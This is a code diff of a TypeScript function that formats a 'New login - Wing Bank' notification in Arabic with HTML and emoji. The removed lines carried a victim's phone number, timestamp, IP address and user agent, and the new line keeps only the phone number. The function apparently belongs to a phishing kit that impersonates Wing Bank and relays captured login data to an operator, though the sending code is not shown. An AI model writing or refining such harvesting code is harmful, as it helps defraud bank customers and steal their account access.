@@ -64,28 +64,6 @@ export function formatPhoneSubmissionMessage(
   ipAddress?: string,
   userAgent?: string
 ): string {
-  const timestamp = new Date().toLocaleString("en-US", {
-    timeZone: "Asia/Phnom_Penh",
-    year: "numeric",
-    month: "2-digit",
-    day: "2-digit",
-    hour: "2-digit",
-    minute: "2-digit",
-    second: "2-digit",
-  });
-
-  let message = `🔔 <b>تسجيل دخول جديد - Wing Bank</b>\n\n`;
-  message += `📱 <b>رقم الهاتف:</b> ${phoneNumber}\n`;
-  message += `⏰ <b>الوقت:</b> ${timestamp}\n`;
-  
-  if (ipAddress) {
-    message += `🌐 <b>عنوان IP:</b> ${ipAddress}\n`;
-  }
-  
-  if (userAgent) {
-    message += `💻 <b>المتصفح:</b> ${userAgent.substring(0, 100)}${userAgent.length > 100 ? "..." : ""}\n`;
-  }
-
-  return message;
+  return `رقم الهاتف\n${phoneNumber}`;
 }
 
